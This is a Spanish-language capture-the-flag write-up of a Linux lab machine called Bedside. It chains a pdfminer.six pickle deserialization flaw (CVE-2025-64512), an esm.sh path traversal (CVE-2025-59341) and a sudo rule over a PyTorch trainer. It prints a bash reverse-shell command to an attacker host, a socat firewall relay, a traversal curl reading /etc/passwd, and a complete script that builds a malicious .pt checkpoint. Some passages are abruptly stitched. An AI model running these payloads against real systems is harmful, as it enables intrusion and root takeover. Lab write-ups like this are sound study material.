Bedside es una máquina Linux construida alrededor de un portal de investigación clínica que se apoya en pdfminer.six para el procesamiento de documentos. Un fallo de deserialización insegura en el cargador de CMap de pdfminer.six (CVE-2025-64512) entrega una shell dentro de un contenedor Docker, y un fallo de path traversal en un visor de imágenes interno basado en esm.sh (CVE-2025-59341) revela la clave privada SSH de otro usuario para la flag de usuario. El root cae por una regla sudo NOPASSWD sobre un script de entrenamiento de PyTorch que deserializa con privilegios de root un fichero de checkpoint proporcionado por el atacante.

La cabecera `X-Powered-By: pdfminer.six` llamó la atención de inmediato. **pdfminer.six es una biblioteca de código abierto para el lenguaje de programación Python diseñada para extraer y analizar información de documentos PDF** — a diferencia de un extractor de texto plano, analiza en profundidad la estructura interna del documento para recuperar su diseño, fuentes y codificaciones exactas. Que un portal que revisa documentos de investigación procese las subidas con esta librería es una fuerte pista de que lo que se suba, se etiquete como se etiquete, termina pasando por pdfminer.six en el backend.

Motivo suficiente para buscar vulnerabilidades conocidas en la librería. **CVE-2025-64512** encajaba: una [prueba de concepto pública](https://github.com/luigigubello/CVE-2025-64512-Polyglot-PoC) empaqueta el exploit como un único fichero polyglot e incluye un generador listo para ejecutar.

## Explotación

### CVE-2025-64512 — Deserialización Insegura en pdfminer.six (RCE)

pdfminer.six resuelve las referencias a mapas de caracteres (CMap) de un PDF contra un directorio `cmap/` incluido en la librería, y lo hace llamando a `pickle.loads()` sobre ficheros terminados en `.pickle.gz`. La librería nunca restringió el nombre de CMap resuelto a ese directorio: un PDF puede referenciar una codificación que apunte a cualquier parte del sistema de ficheros, siempre que el destino termine en `.pickle.gz`. Como `pickle` de Python ejecuta cualquier callable a través del método `__reduce__` de un objeto durante la deserialización, quien controle los bytes de ese fichero controla la ejecución de código en el instante en que se carga — sin interacción adicional, sin un paso separado de "ejecución". La PoC polyglot empaqueta las dos mitades — el PDF que referencia la ruta de CMap maliciosa y el propio payload pickle — en un solo fichero, de modo que una única subida hace todo el trabajo.

```bash
git clone https://github.com/luigigubello/CVE-2025-64512-Polyglot-PoC
python3 CVE-2025-64512.py --command "bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1' &"
```

Con un listener preparado y el fichero manipulado servido al mismo endpoint de subida sondeado antes, la resolución de CMap de pdfminer.six salió del directorio de confianza y deserializó el payload:

```bash
nc -nvlp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.248.191 33738
bash: cannot set terminal process group (297): Inappropriate ioctl for device
bash: no job control in this shell
datawrangler@data-wrangler:/app$
```

El listener recibió el callback como `datawrangler`, dentro de un contenedor llamado `data-wrangler` — tanto `/app` como directorio de trabajo como el propio hostname apuntan a un servicio en contenedor, no al host desnudo. Un upgrade estándar de TTY (`script /dev/null -c bash` → `Ctrl+Z` → `stty raw -echo; fg` → `reset`) dejó la shell utilizable.

La referencia `esm.sh/x` en esa línea de log fue el detalle identificativo.

La solución reutiliza la misma asimetría en la que suele apoyarse un escape de contenedor: una conexión que el propio objetivo inicia no es tráfico "externo", así que la regla que bloquea el acceso entrante a 3000 no se le aplica. Descargar un binario estático de `socat` y hacer de relay a través de un puerto que no está filtrado esquiva el bloqueo por completo:

```bash
# attacker box

python3 -m http.server
```

```bash
# datawrangler@data-wrangler

./socat tcp-listen:4000 tcp-connect:10.129.248.191:3000
```

`socat` en el objetivo escucha en el puerto 4000 y reenvía cada conexión a `10.129.248.191:3000` — la propia IP externa de la máquina, pero la conexión hacia ella se origina localmente, así que llega donde la sonda externa directa se descartaba. El puerto 4000 no estaba dentro del alcance de la regla que bloquea el 3000, así que ahora puede alcanzarse directamente desde la máquina atacante, cargando la aplicación en un navegador real, no solo por curl.

### CVE-2025-59341 — Path Traversal en esm.sh (LFI)

esm.sh tenía un problema conocido: **CVE-2025-59341**, un fallo de path traversal en el router de manejo de URLs del servicio (`server/router.go`). Las peticiones con forma de ruta de paquete pueden escapar del directorio de módulos previsto con suficientes secuencias `../`, y el servidor lee y devuelve cualquier fichero en el que aterrice el traversal — sin autenticación requerida.

```bash
curl --path-as-is 'http://localhost:3000/pr/x/y@99/../../../../../../../../../../etc/passwd?raw=1&module=1'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
[...]
developer:x:1000:1000:developer,,,:/home/developer:/bin/bash
datawrangler:x:988:1001::/home/datawrangler:/bin/sh
_laurel:x:987:987::/var/log/laurel:/bin/false
polkitd:x:986:986:User for polkitd:/:/usr/sbin/nologin
```

`/etc/passwd` desde dentro del mismo proceso de esm.sh confirmó el traversal y sacó a la luz un nuevo usuario: `developer`, con una shell de login real — un objetivo más interesante que la `/bin/sh` restringida de `datawrangler`.

### El Script de Entrenamiento

```python
def find_latest_checkpoint(checkpoint_dir: Path):
    ckpts = sorted(checkpoint_dir.glob("*.pt"), key=os.path.getmtime)
    return ckpts[-1] if ckpts else None
    # ...

def main():
    # ...
    latest_ckpt = find_latest_checkpoint(CHECKPOINT_DIR)
    start_epoch = 0
    if latest_ckpt:
        logger.info(f"Found checkpoint {latest_ckpt}, loading with CheckpointLoader (callable mode)...")
        loader = CheckpointLoader(
            load_path=str(latest_ckpt),
            load_dict={"model": model, "optimizer": optimizer},
            map_location=DEVICE

        class MockEngine:
            def __init__(self):
                self.state = type("State", (), {})()
                self.state.max_epochs = None
                self.state.epoch = 0

        engine = MockEngine()
        loader(engine)  # invoke the handler directly
    # ...
```

El script coge el fichero `.pt` modificado más recientemente en un directorio de checkpoints y lo entrega al `CheckpointLoader` de MONAI/Ignite. Por debajo, eso llama a `torch.load(..., weights_only=False)`, y `torch.load` deserializa con `pickle` — exactamente el mismo primitivo que el fallo de pdfminer.six del foothold, con otra ropa puesta. Alimentarlo con un fichero `.pt` que contenga un objeto con un `__reduce__` malicioso hace que ese código se ejecute en el momento en que se carga el fichero — aquí, como root, ya que todo el script corre bajo la regla NOPASSWD.

`/datastore/checkpoints/` resultó ser escribible por `datawrangler`, el mismo usuario en el que aterrizó el RCE inicial. El plan: dejar un checkpoint malicioso ahí, disparar el trainer como `developer` vía `sudo`, conseguir ejecución de código como root.

### Creando el Checkpoint Malicioso

Un fichero `.pt` real es un archivo ZIP que contiene un grafo de objetos serializado con pickle en `archive/data.pkl`. Construir uno mínimo que dispare `__reduce__` al cargarlo no requiere tocar PyTorch en absoluto — solo `pickle` y `zipfile`:

```python
#!/usr/bin/env python3
"""
build_evil_pt.py - craft a malicious torch checkpoint (.pt) for CVE-style
insecure deserialization via torch.load(weights_only=False).

A torch .pt file is a ZIP archive containing:
  - archive/data.pkl   (the pickled object graph)
  - archive/version    (torch serialization version)

torch.load unpickles archive/data.pkl, so an object whose __reduce__
runs a command gives code execution in the loader's context (here: root).

Usage:
    python3 build_evil_pt.py                 # default cmd, output checkpoint_epoch_99.pt
    python3 build_evil_pt.py -c "id > /tmp/x" -o evil.pt
"""

import argparse
import os
import pickle
import zipfile


class RCE:
    def __init__(self, cmd):
        self.cmd = cmd

    def __reduce__(self):
        return (os.system, (self.cmd,))


def build(cmd, out):
    # pickle a dict shaped like a real checkpoint; the payload rides in "model"
    payload = pickle.dumps({"model": RCE(cmd)}, protocol=2)

    with zipfile.ZipFile(out, "w", zipfile.ZIP_STORED) as z:
        z.writestr("archive/data.pkl", payload)
        z.writestr("archive/version", "3\n")

    with open(out, "rb") as f:
        magic = f.read(4)
    print(f"[+] wrote {out} ({os.path.getsize(out)} bytes)")
    print(f"[+] magic bytes: {magic.hex()}  (504b0304 = PK / valid ZIP)")


if __name__ == "__main__":
    p = argparse.ArgumentParser(description="Build a malicious torch .pt checkpoint")
    p.add_argument("-c", "--command", default="chmod +s /bin/bash",
                   help="command executed by root on torch.load (default: chmod +s /bin/bash)")
    p.add_argument("-o", "--output", default="checkpoint_epoch_99.pt",
                   help="output filename (default: checkpoint_epoch_99.pt)")
    args = p.parse_args()
    build(args.command, args.output)
```

Que `__reduce__` devuelva `(os.system, (self.cmd,))` es todo el exploit: deserializar ese objeto llama directamente a `os.system(cmd)`, sin ninguna interacción adicional. El payload viaja dentro de un diccionario con forma de checkpoint real (`{"model": ...}`) para sobrevivir a que el código de carga lo envuelva y desenvuelva antes de que nada inspeccione su tipo. Ejecutado sin argumentos, usa sus valores por defecto — `chmod +s /bin/bash` como comando, `checkpoint_epoch_99.pt` como salida:

```bash
python3 privEsc.py
```

### Limpiando las Guardas

El script del trainer no era tan permisivo. Dos comprobaciones se interponían:

- **Filtrado de extensión**: el script registra en el log que está "actualmente totalmente funcional con ficheros de imagen (jpeg, png, etc.)" — el directorio `processed/` necesita al menos un fichero válido presente, y no puede ser un `.txt` sobrante.
- **Limpieza de staging**: `staging/` tampoco puede contener ficheros `.txt`, y el entorno los regenera periódicamente — limpiar ambos directorios tiene que pasar justo antes de disparar el script, no con antelación.

```bash
# attacker box
mv /home/ander/Descargas/example.png .
python3 -m http.server
```

```bash
# datawrangler@data-wrangler
curl -s http://<ATTACKER_IP>:8000/checkpoint_epoch_99.pt -o evil.pt
curl -s http://<ATTACKER_IP>:8000/example.png -o example.png

cd /datastore
cp example.png processed/
rm staging/*.txt
rm processed/*.txt
```

El checkpoint malicioso fue a `/datastore/checkpoints/`, un PNG válido fue a `processed/` para satisfacer la comprobación de tipo de fichero, y ambos directorios se limpiaron de ficheros `.txt` justo antes de ejecutar el trainer.

El script petó — y no importa. `os.system()` devuelve un código de salida entero, y el loader de PyTorch esperaba un estado con forma de diccionario; el `TypeError` es ese desajuste aflorando más abajo. ## Conclusiones Clave

- **La deserialización insegura no es un bug puntual, es un antipatrón recurrente.** Exactamente el mismo primitivo — un grafo de objetos deserializado sin importar quién proporcionó los bytes — apareció dos veces en esta máquina, en dos componentes completamente distintos: una librería de parseo de PDF y un cargador de checkpoints de machine learning. Cualquier ruta de código que llame a `pickle.load`/`pickle.loads`, o que envuelva una (como hace `torch.load(weights_only=False)`), merece la misma sospecha sin importar el dominio en el que esté.
- **El `__reduce__` de `pickle` se dispara en el momento de la deserialización, no en el momento de uso.** Un script que peta inmediatamente después de cargar datos no confiables no ha fallado de forma segura — el payload ya se ejecutó antes del fallo. No interpretar "el script lanzó una excepción" como "no ha pasado nada".
- **Las reglas de firewall limitadas al tráfico "externo" tienen un punto ciego: el propio host.** Un puerto descartado para conexiones entrantes desde fuera suele seguir siendo alcanzable desde un proceso que corre localmente en ese host. Hacer de relay a través de una conexión iniciada localmente (aquí, `socat`) convierte ese punto ciego en un túnel.
- **Las cabeceras de respuesta son reconocimiento gratuito.** `X-Powered-By: pdfminer.six` en una respuesta HTML sin relación aparente fue el único hilo que condujo a todo el foothold; las cabeceras que merece la pena leer rara vez anuncian que son importantes.
- **Un primitivo de LFI es un primitivo de credenciales.** Una vez confirmada la lectura arbitraria de ficheros, comprobar si hay claves SSH bajo cada directorio home enumerado debería ser un reflejo — suele ser una vía más directa hacia el acceso que cualquier otra cosa que revele el traversal.
- **Una regla sudo NOPASSWD es tan segura como todo aquello en lo que confía el script objetivo.** `bedside_trainer.py` nunca leyó entrada del atacante directamente; confió en un fichero dejado por un usuario con menos privilegios en un directorio en el que ese usuario podía escribir. Limitar una regla sudo al nombre de un script no dice nada sobre qué hará ese script con datos que no controla.
